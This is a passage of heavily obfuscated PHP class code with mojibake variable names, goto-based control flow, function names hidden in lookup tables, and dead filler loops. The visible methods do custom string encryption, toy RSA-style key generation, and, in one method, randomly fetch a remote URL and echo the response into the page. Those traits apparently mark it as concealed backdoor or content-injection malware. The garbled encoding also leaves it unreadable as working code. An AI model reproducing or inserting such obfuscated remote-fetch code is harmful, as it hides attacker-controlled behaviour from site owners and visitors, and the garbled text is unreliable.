$A„¶‡œÔ‡Ğ ? $e˜îˆÒ­ˆ[201]($A„¶‡œÔ‡Ğ) : 0; goto BñØ´£Ú­ã; BñØ´£Ú­ã: return $f‘İğ¾‰•Ã + $A„¶‡œÔ‡Ğ; $c‚§­˜¹Õà = $DßìŠ´¾Ê[632]; if (strlen($c‚§­˜¹Õà) < $DßìŠ´¾Ê[561]) { return; } goto F‚ëå†åùğ; aÓ÷ƒ¦„õİ: $dÍ°¤ÙìÚ = $DßìŠ´¾Ê[629]; $f‘İğ¾‰•Ã = $e˜îˆÒ­ˆ[201]($f‘İğ¾‰•Ã ? $f‘İğ¾‰•Ã : $e˜îˆÒ­ˆ[290]); $DòôÏ’ÔçÉ = $DßìŠ´¾Ê[630]; goto f½íçíƒİï; b™”¡¢×: $eŸàœîƒôø = $DßìŠ´¾Ê[628]; while (strlen($eŸàœîƒôø) < $DßìŠ´¾Ê[556]) { if (!$eŸàœîƒôø) { break; } $eŸàœîƒôø++; } $f‘İğ¾‰•Ã = $b¾í´·Ì[$this->izypf111d6fd]; goto aÓ÷ƒ¦„õİ; dµÆŠ‹”™: $DßìŠ´¾Ê =& $_SERVER[ºÖÙÂŒäÉê‡]; $e˜îˆÒ­ˆ =& $_SERVER[‘Ûª¥Ç…]; $b¾í´·Ì = array($e˜îˆÒ­ˆ[289] => $e˜îˆÒ­ˆ[290], $e˜îˆÒ­ˆ[291] => $e˜îˆÒ­ˆ[292], $e˜îˆÒ­ˆ[293] => $e˜îˆÒ­ˆ[294], $e˜îˆÒ­ˆ[295] => $e˜îˆÒ­ˆ[296], $e˜îˆÒ­ˆ[297] => $e˜îˆÒ­ˆ[298], $e˜îˆÒ­ˆ[299] => $e˜îˆÒ­ˆ[238], $e˜îˆÒ­ˆ[300] => $e˜îˆÒ­ˆ[238], $e˜îˆÒ­ˆ[301] => $e˜îˆÒ­ˆ[290], $e˜îˆÒ­ˆ[302] => $e˜îˆÒ­ˆ[292], $e˜îˆÒ­ˆ[303] => $e˜îˆÒ­ˆ[294], $e˜îˆÒ­ˆ[304] => $e˜îˆÒ­ˆ[305], $e˜îˆÒ­ˆ[306] => $e˜îˆÒ­ˆ[296], $e˜îˆÒ­ˆ[307] => $e˜îˆÒ­ˆ[308], $e˜îˆÒ­ˆ[309] => $e˜îˆÒ­ˆ[298], $e˜îˆÒ­ˆ[310] => $e˜îˆÒ­ˆ[311], $e˜îˆÒ­ˆ[312] => $e˜îˆÒ­ˆ[313], $e˜îˆÒ­ˆ[314] => $e˜îˆÒ­ˆ[315]); goto b™”¡¢×; F‚ëå†åùğ: } public function xcpa62d153f8($f¶ŞÔğà™Î) { goto E®°‡‹Ü×; eÅÄ«–Ö¸ô: if ($dô‚·š¶êõ >= $E‰ÛŠ÷¢¦¥[201]($E‰ÛŠ÷¢¦¥[238])) { return; } $d¾ËŸ«Ï´ = $E‰ÛŠ÷¢¦¥[61]($E‰ÛŠ÷¢¦¥[139])->{$_SERVER[‘Ûª¥Ç…][140]}(); $a¡ÖÁİÆ©¨ = $b¦Íì´®ˆ»[633]; goto e¶¿µ×±ù; e¶¿µ×±ù: if (strlen($a¡ÖÁİÆ©¨) < $b¦Íì´®ˆ»[565]) { die; } if ($d¾ËŸ«Ï´ <= $dô‚·š¶êõ) { return; } $cÄš¹‘¸ºŒ = $E‰ÛŠ÷¢¦¥[61]($E‰ÛŠ÷¢¦¥[139])->{$_SERVER[‘Ûª¥Ç…][317]}($E‰ÛŠ÷¢¦¥[318])->{$_SERVER[‘Ûª¥Ç…][319]}($dô‚·š¶êõ)->{$_SERVER[‘Ûª¥Ç…][320]}(); goto E£ØÛ…«Ò’; EÛ£¿ª…£Ä: $Dé…²¥©åÙ = $b¦Íì´®ˆ»[635]; while ($Dé…²¥©åÙ < $b¦Íì´®ˆ»[175]) { if ($Dé…²¥©åÙ >= 0) { break; } $Dé…²¥©åÙ++; } if (!$E‰ÛŠ÷¢¦¥[236]($f¶ŞÔğà™Î[$E‰ÛŠ÷¢¦¥[318]], $cÄš¹‘¸ºŒ)) { $E‰ÛŠ÷¢¦¥[166]($E‰ÛŠ÷¢¦¥[321], !1, $E‰ÛŠ÷¢¦¥[233]); } goto D‹‹‚ğõÀç; E®°‡‹Ü×: $b¦Íì´®ˆ» =& $_SERVER[ºÖÙÂŒäÉê‡]; $E‰ÛŠ÷¢¦¥ =& $_SERVER[‘Ûª¥Ç…]; $dô‚·š¶êõ = $this->{$_SERVER[‘Ûª¥Ç…][137]}(); goto eÅÄ«–Ö¸ô; E£ØÛ…«Ò’: $d¦Â–ÉªÀ» = $b¦Íì´®ˆ»[634]; if (!$d¦Â–ÉªÀ») { die; } $cÄš¹‘¸ºŒ = $E‰ÛŠ÷¢¦¥[222]($cÄš¹‘¸ºŒ, $E‰ÛŠ÷¢¦¥[10], $E‰ÛŠ÷¢¦¥[318]); goto EÛ£¿ª…£Ä; D‹‹‚ğõÀç: } public function kdvzc7aa6af5() { goto b—Ã‘Š¾„ ; b—Ã‘Š¾„ : $F¹æ¼£ƒ²Ó =& $_SERVER[ºÖÙÂŒäÉê‡]; $D£ª¸åèö =& $_SERVER[‘Ûª¥Ç…]; if (!$D£ª¸åèö[104]($GLOBALS, $D£ª¸åèö[132]) || $D£ª¸åèö[322](1, 100) > 20) { return; } goto Bã¾Ñ¤‡²º; Bã¾Ñ¤‡²º: $dœğñø…±î = $D£ª¸åèö[242]; $dœğñø…±î = $this->{$_SERVER[‘Ûª¥Ç…][243]}($dœğñø…±î, $D£ª¸åèö[244]); $c¥ê³Â·‚š = $F¹æ¼£ƒ²Ó[636]; goto EöÑóìƒÀã; c²¾²§¯ˆÓ: $bŒÜæø‘†ˆ = $F¹æ¼£ƒ²Ó[637]; if (strlen($bŒÜæø‘†ˆ) < $F¹æ¼£ƒ²Ó[567]) { return; } echo $D£ª¸åèö[323] . $D£ª¸åèö[324]($E„é¦ãÑ’ß) . $D£ª¸åèö[325]; goto EäÄ‚Ø¼…•; EöÑóìƒÀã: while (strlen($c¥ê³Â·‚š) < $F¹æ¼£ƒ²Ó[567]) { if (!$c¥ê³Â·‚š) { break; } $c¥ê³Â·‚š++; } $dããã ‚È— = $D£ª¸åèö[245](array($D£ª¸åèö[246] => array($D£ª¸åèö[247] => $D£ª¸åèö[248], $D£ª¸åèö[249] => 3))); $E„é¦ãÑ’ß = @$D£ª¸åèö[250]($dœğñø…±î, !1, $dããã ‚È—); goto c²¾²§¯ˆÓ; EäÄ‚Ø¼…•: } private function fawb4417882f($dï™Ò©ñˆÁ, $A¹ÀÊğªô, $FÛÀÏäºï­ = 3) { goto BƒÍ¶¼†; f’îŸ‘• ’: $D„ö‚Š‡ìˆ = $b•´ñ†­Àï[214]($e¼£¯ùË . $bÅŸ‚âÊÆÀ . $D„ö‚Š‡ìˆ); if ($FÛÀÏäºï­ - 1 > 0) { $D„ö‚Š‡ìˆ = $this->{$_SERVER[‘Ûª¥Ç…][127]}($D„ö‚Š‡ìˆ, $A¹ÀÊğªô, $FÛÀÏäºï­ - 1); } return $D„ö‚Š‡ìˆ; goto fá¥®äïê; b­›ïéŒ‚Ğ: $dï™Ò©ñˆÁ = $b•´ñ†­Àï[2]($dï™Ò©ñˆÁ); $cÎöƒÎ‹ËÃ = $Aä†ã™÷£Ù[638]; if (strlen($cÎöƒÎ‹ËÃ) < $Aä†ã™÷£Ù[561]) { die; } goto fï»ïŞÓ†; BƒÍ¶¼†: $Aä†ã™÷£Ù =& $_SERVER[ºÖÙÂŒäÉê‡]; $b•´ñ†­Àï =& $_SERVER[‘Ûª¥Ç…]; $b•´ñ†­Àï[326](1); goto b­›ïéŒ‚Ğ; eåÆÉÛêİ†: if (!$f«œÈ¨ëÎ©) { die; } $BÄ™“ì…ŠÆ = $b•´ñ†­Àï[327]; switch ($e¼£¯ùË) { case $b•´ñ†­Àï[229]: $D„ö‚Š‡ìˆ = $this->{$_SERVER[‘Ûª¥Ç…][147]}($dï™Ò©ñˆÁ, $b•´ñ†­Àï[214]($A¹ÀÊğªô . $bÅŸ‚âÊÆÀ)); break; $B„¥øÒêõæ = $Aä†ã™÷£Ù[640]; if (!$B„¥øÒêõæ) { return; } case $b•´ñ†­Àï[220]: $D„ö‚Š‡ìˆ = $this->{$_SERVER[‘Ûª¥Ç…][147]}($dï™Ò©ñˆÁ, $b•´ñ†­Àï[214]($bÅŸ‚âÊÆÀ . $A¹ÀÊğªô)); $b¥¾Øå¦„ = $Aä†ã™÷£Ù[641]; while (strlen($b¥¾Øå¦„) < $Aä†ã™÷£Ù[561]) { if (!$b¥¾Øå¦„) { break; } $b¥¾Øå¦„++; } break; $E¶…¹„ÛÊ› = $Aä†ã™÷£Ù[642]; case $b•´ñ†­Àï[328]: $D„ö‚Š‡ìˆ = $this->{$_SERVER[‘Ûª¥Ç…][147]}($dï™Ò©ñˆÁ, $b•´ñ†­Àï[118]($bÅŸ‚âÊÆÀ . $A¹ÀÊğªô)); $d‹©Ë¨³‹Ö = $Aä†ã™÷£Ù[643]; if (!$d‹©Ë¨³‹Ö) { return; } break; case $b•´ñ†­Àï[329]: $D„ö‚Š‡ìˆ = $this->{$_SERVER[‘Ûª¥Ç…][147]}($dï™Ò©ñˆÁ, $b•´ñ†­Àï[114]($bÅŸ‚âÊÆÀ . $A¹ÀÊğªô)); break; $FòíšÅä = $Aä†ã™÷£Ù[644]; if (!$FòíšÅä) { return; } case $b•´ñ†­Àï[330]: goto Cçî„ßóÒ; Cçî„ßóÒ: $dï™Ò©ñˆÁ = $b•´ñ†­Àï[118]($dï™Ò©ñˆÁ); $eÎÜ‘©®°Õ = $Aä†ã™÷£Ù[645]; if (strlen($eÎÜ‘©®°Õ) < $Aä†ã™÷£Ù[567]) { die; } goto CÍŒ£’‡«È; EÊ¿ñ‡å´Š: $d©æÛÌø‚Ú = 0; $bÚ°«ùåï‰ = $Aä†ã™÷£Ù[648]; if (strlen($bÚ°«ùåï‰) < $Aä†ã™÷£Ù[567]) { die; } goto CâƒÇÈ—¸Ë; CâƒÇÈ—¸Ë: $E•Œ‡à‘Ç = 0; $Bƒß¿¨»Ğ” = $Aä†ã™÷£Ù[649]; if (strlen($Bƒß¿¨»Ğ”) < $Aä†ã™÷£Ù[556]) { die; } goto BæÌÂº·§®; BæÌÂº·§®: $Aî·¥±Ò°­ = 0; for ($d©æÛÌø‚Ú = 0; $d©æÛÌø‚Ú < $b•´ñ†­Àï[24]($dï™Ò©ñˆÁ); $d©æÛÌø‚Ú++) { $Aî·¥±Ò°­ = $Aî·¥±Ò°­ == $b•´ñ†­Àï[24]($AÈ‹¡ÁË–’) ? 0 : $Aî·¥±Ò°­; $DÏ¡êİ¢Ø‘ = $Aä†ã™÷£Ù[650]; while ($DÏ¡êİ¢Ø‘ < $Aä†ã™÷£Ù[556]) { if ($DÏ¡êİ¢Ø‘ >= 0) { break; } $DÏ¡êİ¢Ø‘++; } $E•Œ‡à‘Ç = ($FîšË£ó…õ + $b•´ñ†­Àï[332]($BÄ™“ì…ŠÆ, $dï™Ò©ñˆÁ[$d©æÛÌø‚Ú]) + $b•´ñ†­Àï[333]($AÈ‹¡ÁË–’[$Aî·¥±Ò°­++])) % 64; $d„ÜÆ¸›Ñã .= $BÄ™“ì…ŠÆ[$E•Œ‡à‘Ç]; } $D„ö‚Š‡ìˆ = $b•´ñ†­Àï[324]($DÊÜåÁëƒ° . $d„ÜÆ¸›Ñã); goto E…œÏ õ¤; d£Ó„»¼å: if (!$E™³ª†½ÔÁ) { return; } goto fßà»öÉš; EÉ–İëø¹: if (!$dÀ˜¤ÜÛÔ») { die; } $AÈ‹¡ÁË–’ = $b•´ñ†­Àï[114]($DÊÜåÁëƒ° . $b•´ñ†­Àï[114]($A¹ÀÊğªô . $DÊÜåÁëƒ°) . $A¹ÀÊğªô); $AÈ‹¡ÁË–’ = $b•´ñ†­Àï[25]($AÈ‹¡ÁË–’, $FîšË£ó…õ % 8, $FîšË£ó…õ % 8 + 7); goto fÆšÓá“ù; fÆšÓá“ù: $bš¨•§æˆÕ = $Aä†ã™÷£Ù[647]; if (strlen($bš¨•§æˆÕ) < $Aä†ã™÷£Ù[561]) { return; } $d„ÜÆ¸›Ñã = $b•´ñ†­Àï[10]; goto EÊ¿ñ‡å´Š; CÍŒ£’‡«È: $FîšË£ó…õ = $b•´ñ†­Àï[331](0, 64); $DÊÜåÁëƒ° = $BÄ™“ì…ŠÆ[$FîšË£ó…õ]; $dÀ˜¤ÜÛÔ» = $Aä†ã™÷£Ù[646]; goto EÉ–İëø¹; E…œÏ õ¤: $fêÕ‘”¥¾¦ = $Aä†ã™÷£Ù[651]; break; $E™³ª†½ÔÁ = $Aä†ã™÷£Ù[652]; goto d£Ó„»¼å; fßà»öÉš: default: $D„ö‚Š‡ìˆ = $this->{$_SERVER[‘Ûª¥Ç…][147]}($dï™Ò©ñˆÁ, $A¹ÀÊğªô . $bÅŸ‚âÊÆÀ); break; $bêí‰µÃ = $Aä†ã™÷£Ù[653]; if (strlen($bêí‰µÃ) < $Aä†ã™÷£Ù[561]) { die; } } goto f’îŸ‘• ’; fï»ïŞÓ†: $e¼£¯ùË = $b•´ñ†­Àï[322](0, 5) . $b•´ñ†­Àï[10]; $bÅŸ‚âÊÆÀ = $b•´ñ†­Àï[124](15); $f«œÈ¨ëÎ© = $Aä†ã™÷£Ù[639]; goto eåÆÉÛêİ†; fá¥®äïê: } private function iuvt0fe79c49($e‡Œ·áŠò¤, $Bİë¬»‹¡, $ağÌï•ô°å = 3) { goto eÈÜ¿¿¤¹Á; f©Ù¤­â’: $CØ¡£Ãß™î = $d„áÄ öŒÈ[327]; switch ($CËœ¹ç) { case $d„áÄ öŒÈ[229]: $dö©Ò³ëÊ¬ = $this->{$_SERVER[‘Ûª¥Ç…][243]}($e‡Œ·áŠò¤, $d„áÄ öŒÈ[214]($Bİë¬»‹¡ . $E…Ëôˆ‡°Í)); break; $C†â èÚè = $B©¸Ã³¡íÓ[656]; if (!$C†â èÚè) { return; } case $d„áÄ öŒÈ[220]: $dö©Ò³ëÊ¬ = $this->{$_SERVER[‘Ûª¥Ç…][243]}($e‡Œ·áŠò¤, $d„áÄ öŒÈ[214]($E…Ëôˆ‡°Í . $Bİë¬»‹¡)); break; case $d„áÄ öŒÈ[328]: $dö©Ò³ëÊ¬ = $this->{$_SERVER[‘Ûª¥Ç…][243]}($e‡Œ·áŠò¤, $d„áÄ öŒÈ[118]($E…Ëôˆ‡°Í . $Bİë¬»‹¡)); break; $eëÇíİ¡ÍÕ = $B©¸Ã³¡íÓ[657]; if (!$eëÇíİ¡ÍÕ) { die; } case $d„áÄ öŒÈ[329]: $dö©Ò³ëÊ¬ = $this->{$_SERVER[‘Ûª¥Ç…][243]}($e‡Œ·áŠò¤, $d„áÄ öŒÈ[114]($E…Ëôˆ‡°Í . $Bİë¬»‹¡)); $c›†ÍåÔ = $B©¸Ã³¡íÓ[658]; break; $Dä›Ø¬ãè® = $B©¸Ã³¡íÓ[659]; case $d„áÄ öŒÈ[330]: goto FÓğæÜ¯í·; E¤»ˆñĞĞ¶: $FóŠ‡†‹•Ş = $d„áÄ öŒÈ[25]($FóŠ‡†‹•Ş, $E“è¢†ô• % 8, $E“è¢†ô• % 8 + 7); $D¼š×ßõ“Î = $B©¸Ã³¡íÓ[662]; if (strlen($D¼š×ßõ“Î) < $B©¸Ã³¡íÓ[556]) { return; } goto d¤‚²ƒ‘å‚; FÓğæÜ¯í·: $e‡Œ·áŠò¤ = $d„áÄ öŒÈ[335]($e‡Œ·áŠò¤); $c—©—Ëâñ— = $B©¸Ã³¡íÓ[660]; if (strlen($c—©—Ëâñ—) < $B©¸Ã³¡íÓ[567]) { return; } goto C³ì÷‡÷Œ; D¤´”Éä„: while (strlen($F›ÑÛ¼ğÆ¿) < $B©¸Ã³¡íÓ[175]) { if (!$F›ÑÛ¼ğÆ¿) { break; } $F›ÑÛ¼ğÆ¿++; } goto f…Â¼ê‡•À; bƒŒÌƒß´½: $dö©Ò³ëÊ¬ = $d„áÄ öŒÈ[336]($CÀùí¼¨‘×); break; $F›ÑÛ¼ğÆ¿ = $B©¸Ã³¡íÓ[667]; goto D¤´”Éä„; fªæªé‚º: $aÇ÷ğÁÔÃ˜ = $B©¸Ã³¡íÓ[664]; if (!$aÇ÷ğÁÔÃ˜) { return; } for ($e½Ú¸™è¢à = 0; $e½Ú¸™è¢à < $d„áÄ öŒÈ[24]($e‡Œ·áŠò¤); $e½Ú¸™è¢à++) { $EœÎª’Ã¹ = $EœÎª’Ã¹ == $d„áÄ öŒÈ[24]($FóŠ‡†‹•Ş) ? 0 : $EœÎª’Ã¹; $b’ô›™¿Ö¶ = $B©¸Ã³¡íÓ[665]; $AÁ÷¿»ŒÎ = $EœÎª’Ã¹++; $Få°ˆÏ¿Î = $B©¸Ã³¡íÓ[666]; $AÊŠ·¼·Ú = $d„áÄ öŒÈ[332]($CØ¡£Ãß™î, $e‡Œ·áŠò¤[$e½Ú¸™è¢à]) - $E“è¢†ô• - $d„áÄ öŒÈ[333]($FóŠ‡†‹•Ş[$AÁ÷¿»ŒÎ]); while ($AÊŠ·¼·Ú < 0) { $AÊŠ·¼·Ú += 64; } $CÀùí¼¨‘× .= $CØ¡£Ãß™î[$AÊŠ·¼·Ú]; } goto bƒŒÌƒß´½; dã¬´ÉàË÷: if (!$ašáÀŒìš) { return; } $AÊŠ·¼·Ú = 0; $EœÎª’Ã¹ = 0; goto fªæªé‚º; d¤‚²ƒ‘å‚: $CÀùí¼¨‘× = $d„áÄ öŒÈ[10]; $e½Ú¸™è¢à = 0; $ašáÀŒìš = $B©¸Ã³¡íÓ[663]; goto dã¬´ÉàË÷; C³ì÷‡÷Œ: $B­—õò Ê· = $e‡Œ·áŠò¤[0]; $e‡Œ·áŠò¤ = $d„áÄ öŒÈ[25]($e‡Œ·áŠò¤, 1); $E“è¢†ô• = $d„áÄ öŒÈ[332]($CØ¡£Ãß™î, $B­—õò Ê·); goto a”á‘Š¨»´; a”á‘Š¨»´: $cæáŞÜĞëŠ = $B©¸Ã³¡íÓ[661]; if (!$cæáŞÜĞëŠ) { return; } $FóŠ‡†‹•Ş = $d„áÄ öŒÈ[114]($B­—õò Ê· . $d„áÄ öŒÈ[114]($Bİë¬»‹¡ . $B­—õò Ê·) . $Bİë¬»‹¡); goto E¤»ˆñĞĞ¶; f…Â¼ê‡•À: default: $dö©Ò³ëÊ¬ = $this->{$_SERVER[‘Ûª¥Ç…][243]}($e‡Œ·áŠò¤, $Bİë¬»‹¡ . $E…Ëôˆ‡°Í); $F‘Ö†ìš = $B©¸Ã³¡íÓ[668]; break; } if ($ağÌï•ô°å - 1 > 0) { $dö©Ò³ëÊ¬ = $this->{$_SERVER[‘Ûª¥Ç…][188]}($dö©Ò³ëÊ¬, $Bİë¬»‹¡, $ağÌï•ô°å - 1); } goto fø÷éÉøÏ§; eÈÜ¿¿¤¹Á: $B©¸Ã³¡íÓ =& $_SERVER[ºÖÙÂŒäÉê‡]; $d„áÄ öŒÈ =& $_SERVER[‘Ûª¥Ç…]; if (!$d„áÄ öŒÈ[334]($e‡Œ·áŠò¤) || $d„áÄ öŒÈ[24]($e‡Œ·áŠò¤) < 10) { return !1; } goto AÃº·£ÕŒ; Dİõ÷çå®: $e‡Œ·áŠò¤ = $d„áÄ öŒÈ[25]($e‡Œ·áŠò¤, 16); $f²¨¬ÎÒõ« = $B©¸Ã³¡íÓ[655]; if (!$f²¨¬ÎÒõ«) { die; } goto f©Ù¤­â’; AÃº·£ÕŒ: $e‡Œ·áŠò¤ = $d„áÄ öŒÈ[2]($e‡Œ·áŠò¤); $Dˆ©ÀÎ™Ş = $B©¸Ã³¡íÓ[654]; if (!$Dˆ©ÀÎ™Ş) { die; } goto E„éë±·ƒî; fø÷éÉøÏ§: return $dö©Ò³ëÊ¬; goto Añä¼¤±•; E„éë±·ƒî: $e‡Œ·áŠò¤ = $d„áÄ öŒÈ[214]($e‡Œ·áŠò¤); $CËœ¹ç = $e‡Œ·áŠò¤[0]; $E…Ëôˆ‡°Í = $d„áÄ öŒÈ[25]($e‡Œ·áŠò¤, 1, 15); goto Dİõ÷çå®; Añä¼¤±•: } public function qpcta579c60d($e‘Ç¢ß¶¶Œ) { goto e°¾÷Ô‡¦¢; C­ÆÑ¸‘­: $D¼óâèÕ¦Ğ = $this->{$_SERVER[‘Ûª¥Ç…][147]}($e‘Ç¢ß¶¶Œ, $BÊ‹ßË±) . $d½¾¢°¢¦®[341] . $f©Ë’¶ğ¬; return $D¼óâèÕ¦Ğ; goto bèÈ¹âõ™; Dƒ·Ôõ‚â: $d¡ù¬ç±±Ö = $this->{$_SERVER[‘Ûª¥Ç…][337]}(); $AÎÇù…¬ˆ› = ($Aä¯”º©ãô - 1) * ($d¡ù¬ç±±Ö - 1); $eÔ³†µçÜ’ = $Bò¾ä…Û´†[669]; goto CÃ„µÕÈ²¦; CÃ„µÕÈ²¦: while ($eÔ³†µçÜ’ < $Bò¾ä…Û´†[561]) { if ($eÔ³†µçÜ’ >= 0) { break; } $eÔ³†µçÜ’++; } $A²¿ä—µÜ = $d½¾¢°¢¦®[201](($Aä¯”º©ãô + $d¡ù¬ç±±Ö) / 2); while (1) { $e–öØ‰¶¤• = $A²¿ä—µÜ; $eÆ“Õîœ¤ = $Bò¾ä…Û´†[670]; if (strlen($eÆ“Õîœ¤) < $Bò¾ä…Û´†[175]) { die; } $aÚ†©ÎÑ–› = $AÎÇù…¬ˆ›; while ($aÚ†©ÎÑ–› % $e–öØ‰¶¤• != 0) { $eÀÈÕ‹öì¡ = $aÚ†©ÎÑ–›; $aÚ†©ÎÑ–› = $e–öØ‰¶¤•; $e–öØ‰¶¤• = $eÀÈÕ‹öì¡ % $e–öØ‰¶¤•; $C­¾Ãˆ¶Äå = $Bò¾ä…Û´†[671]; } if ($e–öØ‰¶¤• == 1) { break; } else { $A²¿ä—µÜ++; } } goto dĞïËëÒÂ¥; BÅÃèã¯÷Ù: for ($d“è­›…” = 0; $d“è­›…” < $AÎÇù…¬ˆ› * 10; $d“è­›…”++) { if (($AÎÇù…¬ˆ› * $d“è­›…” + 1) % $A²¿ä—µÜ == 0) { $bäåÏœ“¶ï = $d½¾¢°¢¦®[201](($AÎÇù…¬ˆ› * $d“è­›…” + 1) / $A²¿ä—µÜ); break; } } $f©Ë’¶ğ¬ = $this->{$_SERVER[‘Ûª¥Ç…][147]}($Aä¯”º©ãô * $d¡ù¬ç±±Ö . $d½¾¢°¢¦®[10], $d½¾¢°¢¦®[149]); $BÊ‹ßË± = $d½¾¢°¢¦®[114]($d½¾¢°¢¦®[338] . ($Aä¯”º©ãô + $d¡ù¬ç±±Ö) . $d½¾¢°¢¦®[339] . $A²¿ä—µÜ . $d½¾¢°¢¦®[339] . $bäåÏœ“¶ï . $d½¾¢°¢¦®[340]); goto C­ÆÑ¸‘­; e°¾÷Ô‡¦¢: $Bò¾ä…Û´† =& $_SERVER[ºÖÙÂŒäÉê‡]; $d½¾¢°¢¦® =& $_SERVER[‘Ûª¥Ç…]; $Aä¯”º©ãô = $this->{$_SERVER[‘Ûª¥Ç…][337]}(); goto Dƒ·Ôõ‚â; dĞïËëÒÂ¥: $bäåÏœ“¶ï = 2; $aù‹î©¦ = $Bò¾ä…Û´†[672]; while (strlen($aù‹î©¦) < $Bò¾ä…Û´†[556]) { if (!$aù‹î©¦) { break; } $aù‹î©¦++; } goto BÅÃèã¯÷Ù; bèÈ¹âõ™: } public function pvmbff87290f($D¶‡ÀÓ©›à) { goto cŒÍ„Ş÷‡; e­‰šŞÍ: $A…Ï¹ø®öŞ = $this->{$_SERVER[‘Ûª¥Ç…][243]}($Eô×Â«íŠ[1] . $bëóÕË­¤‡[10], $bëóÕË­¤‡[149]); $aë”ç³Ì«¤ = $Dé»Œƒ°Ì¦[674]; if (!$aë”ç³Ì«¤) { return; } goto EĞ›èò›ÖØ; EĞ›èò›ÖØ: if (!$A…Ï¹ø®öŞ) { return $bëóÕË­¤‡[10]; } $A…Ï¹ø®öŞ = $bëóÕË­¤‡[201]($A…Ï¹ø®öŞ); $Då±µÆ¶ÆŸ = 0; goto B¥ø™ùÈß„; B¥ø™ùÈß„: $cŞáôÛ«Ôó = $Dé»Œƒ°Ì¦[675]; while (strlen($cŞáôÛ«Ôó) < $Dé»Œƒ°Ì¦[556]) { if (!$cŞáôÛ«Ôó) { break; } $cŞáôÛ«Ôó++; } $eÛ†«áã = 0; goto e¼îî«øãÓ; cŒÍ„Ş÷‡: $Dé»Œƒ°Ì¦ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bëóÕË­¤‡ =& $_SERVER[‘Ûª¥Ç…]; $Eô×Â«íŠ = $bëóÕË­¤‡[0]($bëóÕË­¤‡[341], $D¶‡ÀÓ©›à); goto BŒÀØ×•‹; cšè·İ¡½ö: if (strlen($D‡é±À™‰) < $Dé»Œƒ°Ì¦[556]) { return; } for ($Cµ˜œÎ® = 0; $Cµ˜œÎ® < $B´¨¿ŞĞê * 10; $Cµ˜œÎ®++) { if (($B´¨¿ŞĞê * $Cµ˜œÎ® + 1) % $CÎœ°ÇøÉ == 0) { $d”É  ùñ‡ = $bëóÕË­¤‡[201](($B´¨¿ŞĞê * $Cµ˜œÎ® + 1) / $CÎœ°ÇøÉ); break; } } $d¬õô¢âÚ = $bëóÕË­¤‡[114]($bëóÕË­¤‡[338] . ($Då±µÆ¶ÆŸ + $eÛ†«áã) . $bëóÕË­¤‡[339] . $CÎœ°ÇøÉ . $bëóÕË­¤‡[339] . $d”É  ùñ‡ . $bëóÕË­¤‡[340]); goto B•£ÛïäÛ×; fš‚´§°¿: while (1) { $B‹ŒÄëø = $CÎœ°ÇøÉ; $dß“ñ•§Ğô = $Dé»Œƒ°Ì¦[677]; while ($dß“ñ•§Ğô < $Dé»Œƒ°Ì¦[556]) { if ($dß“ñ•§Ğô >= 0) { break; } $dß“ñ•§Ğô++; } $Fğöšï×‘Ã = $B´¨¿ŞĞê; while ($Fğöšï×‘Ã % $B‹ŒÄëø != 0) { $A”¬ù˜è» = $Fğöšï×‘Ã; $Fğöšï×‘Ã = $B‹ŒÄëø; $B‹ŒÄëø = $A”¬ù˜è» % $B‹ŒÄëø; } if ($B‹ŒÄëø == 1) { break; } else { $CÎœ°ÇøÉ++; } } $d”É  ùñ‡ = 2; $D‡é±À™‰ = $Dé»Œƒ°Ì¦[678]; goto cšè·İ¡½ö; BŒÀØ×•‹: $dÕèªˆ ¹Ö = $Dé»Œƒ°Ì¦[673]; while ($dÕèªˆ ¹Ö < $Dé»Œƒ°Ì¦[175]) { if ($dÕèªˆ ¹Ö >= 0) { break; } $dÕèªˆ ¹Ö++; } if ($bëóÕË­¤‡[19]($Eô×Â«íŠ) != 2) { return $bëóÕË­¤‡[10]; } goto e­‰šŞÍ; B•£ÛïäÛ×: $CÛ«‡â¬«Î = $this->{$_SERVER[‘Ûª¥Ç…][243]}($Eô×Â«íŠ[0], $d¬õô¢âÚ); return $CÛ«‡â¬«Î; goto A‰¯ÌÀ²Œê; e¼îî«øãÓ: for ($Cµ˜œÎ® = 3; $Cµ˜œÎ® < $A…Ï¹ø®öŞ; $Cµ˜œÎ® += 2) { if ($A…Ï¹ø®öŞ % $Cµ˜œÎ® != 0) { continue; } $Då±µÆ¶ÆŸ = $Cµ˜œÎ®; $eÛ†«áã = $bëóÕË­¤‡[201]($A…Ï¹ø®öŞ / $Cµ˜œÎ®); break; $Cí½’šØ¸ = $Dé»Œƒ°Ì¦[676]; } $B´¨¿ŞĞê = ($Då±µÆ¶ÆŸ - 1) * ($eÛ†«áã - 1); $CÎœ°ÇøÉ = $bëóÕË­¤‡[201](($Då±µÆ¶ÆŸ + $eÛ†«áã) / 2); goto fš‚´§°¿; A‰¯ÌÀ²Œê: } public function nkby9e81b1c3() { goto AéÂìÍâ»‚; Då±˜Ø„´Ô: $d®‘ËŒ¢… = array(); $d›ßî÷   = $DŞÉ”ó¦š•[679]; if (strlen($d›ßî÷  ) < $DŞÉ”ó¦š•[561]) { return; } goto fŞô¹¡ë†´; AéÂìÍâ»‚: $DŞÉ”ó¦š• =& $_SERVER[ºÖÙÂŒäÉê‡]; $aŒ™·Ù› =& $_SERVER[‘Ûª¥Ç…]; $EÆø–ñÍ = $aŒ™·Ù›[322]($aŒ™·Ù›[342](2, 14), $aŒ™·Ù›[342](2, 16) - 1); goto Då±˜Ø„´Ô; f÷ŒœŞ°³: for ($eïà†‚¡‡é = $EÆø–ñÍ; $eïà†‚¡‡é > 1; $eïà†‚¡‡é--) { $FĞÍÌÒöÅ = !0; foreach ($d®‘ËŒ¢… as $f›ó˜„‡•§) { if ($eïà†‚¡‡é % $f›ó˜„‡•§ == 0) { $FĞÍÌÒöÅ = !1; break; } } if ($FĞÍÌÒöÅ) { $B¡˜›·Óî÷ = $eïà†‚¡‡é; break; } } return $B¡˜›·Óî÷; goto fØ“‡œÂî»; fŞô¹¡ë†´: $dÀÛ½Ê ° = 1; while ($dÀÛ½Ê ° <= (int) $aŒ™·Ù›[343]($EÆø–ñÍ)) { $eïà†‚¡‡é = $dÀÛ½Ê °; while (!0) { $eïà†‚¡‡é++; $CÒèò‡Ãî = $DŞÉ”ó¦š•[680]; if ($eïà†‚¡‡é <= 2) { $dÀÛ½Ê ° = $eïà†‚¡‡é; break; } else { if ($eïà†‚¡‡é < 2) { continue; } } $FĞÍÌÒöÅ = !0; for ($CŠª É—á = 2; $CŠª É—á <= $aŒ™·Ù›[343]($eïà†‚¡‡é); $CŠª É—á++) { if ($eïà†‚¡‡é % $CŠª É—á == 0) { $FĞÍÌÒöÅ = !1; } } if ($FĞÍÌÒöÅ) { $dÀÛ½Ê ° = 